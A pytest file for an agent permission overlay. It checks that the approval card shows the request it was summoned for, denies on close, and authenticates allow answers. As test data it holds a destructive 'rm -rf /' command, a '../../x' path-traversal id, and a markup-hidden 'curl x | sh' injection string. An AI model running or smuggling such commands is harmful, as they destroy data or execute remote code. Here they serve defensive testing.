"""The overlay answers the question it was summoned about.

Two separate ways the card could lie about what it was asking. It read "the
newest pending request" rather than the id the hook named, so a second
question arriving first put one command on screen above the other's Allow
button. And closing it -- Esc, or a click outside -- wrote no verdict at all,
so the agent stayed blocked until the timeout with no way to reopen it.
"""
from __future__ import annotations

import json
import os
import re
import subprocess
from pathlib import Path

import cardhelp

ROOT = Path(__file__).resolve().parent.parent
SETTINGS = (ROOT / "Settings.qml").read_text()


def _run(rundir: Path, *args: str) -> str:
    return cardhelp.cli(rundir, *args).stdout.strip()


def _cards(rundir: Path, desk, *commands: str) -> list[str]:
    """Put one card up per command (the daemon picks the ids since phase
    M7); their ids, oldest first."""
    ids = []
    for c in commands:
        _t, out = cardhelp.post_async(desk, {"tool": "Bash", "summary": c}, 20)
        ids.append(out["id"])
    return ids


class TestPendingById:
    def test_it_returns_the_request_that_was_asked_for(self, tmp_path):
        with cardhelp.live_desk(tmp_path) as desk:
            a, b = _cards(tmp_path, desk, "rm -rf /", "ls")
            got = json.loads(_run(tmp_path, "pending", b))
            assert got["summary"] == "ls" and got["id"] == b

    def test_an_unknown_id_is_not_some_other_request(self, tmp_path):
        """Falling back to "the newest" here would show one command and
        answer a different one."""
        with cardhelp.live_desk(tmp_path) as desk:
            _cards(tmp_path, desk, "rm -rf /")
            assert json.loads(_run(tmp_path, "pending", "c" * 12)) == {}

    def test_a_malformed_id_is_refused_rather_than_used(self, tmp_path):
        with cardhelp.live_desk(tmp_path) as desk:
            _cards(tmp_path, desk, "rm -rf /")
            assert json.loads(_run(tmp_path, "pending", "../../x")) == {}

    def test_with_no_id_it_still_answers_for_a_person_at_a_terminal(self, tmp_path):
        with cardhelp.live_desk(tmp_path) as desk:
            _cards(tmp_path, desk, "ls", "rm -rf /")
            got = json.loads(_run(tmp_path, "pending"))
            assert got["summary"] == "rm -rf /"
            # A terminal sees the question, never the nonce an allow needs.
            assert got["verified"] is False and "nonce" not in got

    def test_nothing_pending_says_so_rather_than_saying_nothing(self, tmp_path):
        """`set -euo pipefail` plus `ls` on a directory that is not there
        once printed nothing and exited 2. With no daemon at all, and with
        one that has nothing waiting, the answer is {} and exit 0."""
        done = cardhelp.cli(tmp_path, "pending")
        assert done.returncode == 0, done.stderr
        assert json.loads(done.stdout) == {}
        with cardhelp.live_desk(tmp_path):
            done = cardhelp.cli(tmp_path, "pending")
            assert done.returncode == 0 and json.loads(done.stdout) == {}

    def test_a_file_in_the_old_folder_is_not_a_question(self, tmp_path):
        """Phase M7: the request files are gone; one left there (or put
        there) is shown to nobody."""
        d = tmp_path / "agentvoice" / "permissions"
        d.mkdir(parents=True)
        (d / ("a" * 12 + ".request")).write_text(json.dumps({"summary": "rm -rf /"}))
        with cardhelp.live_desk(tmp_path):
            assert json.loads(_run(tmp_path, "pending")) == {}
            assert json.loads(_run(tmp_path, "pending", "a" * 12)) == {}

    def test_permit_refuses_an_id_that_is_not_one(self, tmp_path):
        done = cardhelp.cli(tmp_path, "permit", "../../x", "allow")
        assert done.returncode == 2
        assert not list(tmp_path.rglob("*.response"))


class TestTheCardAnswers:
    def test_the_overlay_asks_for_the_summoned_id(self):
        body = SETTINGS[SETTINGS.index("function open("):]
        body = body[:body.index("\n  }")]
        assert "p.id" in body, "the payload names the request"
        assert '"pending", wanted' in body

    def test_closing_the_card_denies(self):
        body = SETTINGS[SETTINGS.index("function dismiss()"):]
        body = body[:body.index("\n  }")]
        assert 'answer("deny")' in body

    def test_a_verdict_is_written_only_once(self):
        """dismiss() is reached both by Esc and by answer() itself."""
        body = SETTINGS[SETTINGS.index("function dismiss()"):]
        body = body[:body.index("\n  }")]
        assert "!answered" in body
        assert "answered = true" in SETTINGS

    def test_the_countdown_and_the_request_are_reset_when_it_opens(self):
        body = SETTINGS[SETTINGS.index("function open("):]
        body = body[:body.index("\n  }")]
        assert re.search(r"secondsLeft\s*=\s*0", body)
        assert re.search(r"request\s*=\s*\(\{\}\)", body)
        assert re.search(r"answered\s*=\s*false", body)

    def test_the_command_is_shown_as_plain_text(self):
        """`ls <b></b><!-- ; curl x | sh -->` renders as `ls` under AutoText."""
        card = SETTINGS[SETTINGS.index('text: root.request.summary'):]
        card = card[:card.index("}")]
        assert "textFormat: Text.PlainText" in card


class TestTheAnswerIsAuthenticated:
    """Phase M7: the overlay's side of the checked answer (cards.py has the
    daemon's)."""

    @staticmethod
    def _fn(name: str) -> str:
        body = SETTINGS[SETTINGS.index(f"function {name}("):]
        return body[:body.index("\n  }")]

    def test_the_nonce_goes_on_stdin_never_argv(self):
        body = self._fn("answer")
        cmd = re.search(r"command: (\[[^\]]*\])", body).group(1)
        assert cmd == '["agentvoice", "permit", cid, verdict]'
        assert "nonce" not in cmd and "digest" not in cmd
        pending = body[body.index("pending:"):]
        assert "request.nonce" in pending and "request.digest" in pending

    def test_the_answers_stdin_stays_open_until_it_is_done(self):
        """The daemon checks the answer's stdin is a pipe the shell still
        holds; closing it after the write would fail that check."""
        proc = SETTINGS[SETTINGS.index("id: permitProc"):]
        proc = proc[:proc.index("\n  // The daemon holds the card")]
        assert "stdinEnabled: true" in proc and "write(proc.pending)" in proc
        assert "stdinEnabled = false" not in proc

    def test_each_answer_has_its_own_process(self):
        """Setting `running` on a Process still sending an earlier answer
        does nothing, so a second card's answer would be lost."""
        assert "permitProc.createObject(" in self._fn("answer")
        assert not re.search(r"Process \{ id: permit \}", SETTINGS)

    def test_allow_needs_the_nonce_the_daemon_handed_over(self):
        decl = SETTINGS[SETTINGS.index("readonly property bool mayAllow"):]
        decl = decl[:decl.index("\n\n")]
        assert "request.verified === true" in decl and "[0-9a-f]{32}" in decl
        assert "!answered" in decl
        for label in ('text: "Allow once"', 'text: "Allow all in this chat"'):
            button = SETTINGS[SETTINGS.index(label):]
            button = button[:button.index("onClicked")]
            assert "enabled: root.mayAllow" in button, label

    def test_a_greyed_out_allow_says_why(self):
        """A control that does nothing says why -- in plain text, since the
        reason is the daemon's words about a process."""
        note = SETTINGS[SETTINGS.index("Allow cannot be accepted from here"):][:800]
        assert "root.request.why" in note
        assert "textFormat: Text.PlainText" in note

    def test_a_refused_allow_is_shown_not_swallowed(self):
        body = self._fn("permitReplied")
        assert "answerFailed = true" in body and "told no" in body
        assert "cid !== answerFor" in body       # an older card's reply
        assert "root.permitNeverRan" in SETTINGS[SETTINGS.index("id: permitProc"):]

    def test_the_countdown_stops_once_answered(self):
        timer = SETTINGS[SETTINGS.index("// Silence is a denial, so the countdown"):]
        timer = timer[:timer.index("repeat:")]
        assert "!root.answered" in timer


class TestReviewPass1Overlay:
    """Codex review of M7, pass 1: the overlay's side."""

    def test_each_summons_gets_its_own_lookup_and_only_the_latest_counts(self):
        body = SETTINGS[SETTINGS.index("function open("):]
        body = body[:body.index("\n  }")]
        assert "probeProc.createObject(" in body and "probeSeq += 1" in body
        reply = SETTINGS[SETTINGS.index("function probeReplied("):]
        reply = reply[:reply.index("\n  }")]
        assert "seq !== probeSeq" in reply

    def test_a_card_that_is_gone_takes_the_overlay_with_it(self):
        reply = SETTINGS[SETTINGS.index("function probeReplied("):]
        reply = reply[:reply.index("\n  }")]
        assert "!request.id) hideCard()" in reply

    def test_the_countdown_waits_for_the_card(self):
        timer = SETTINGS[SETTINGS.index("// Silence is a denial, so the countdown"):]
        timer = timer[:timer.index("repeat:")]
        assert "!!root.request.id" in timer

    def test_told_no_only_when_the_daemon_said_no(self):
        body = SETTINGS[SETTINGS.index("function permitReplied("):]
        body = body[:body.index("\n  }")]
        no = body[body.index("d.ok === false"):]
        assert no.index("told no") < no.index("is not known")
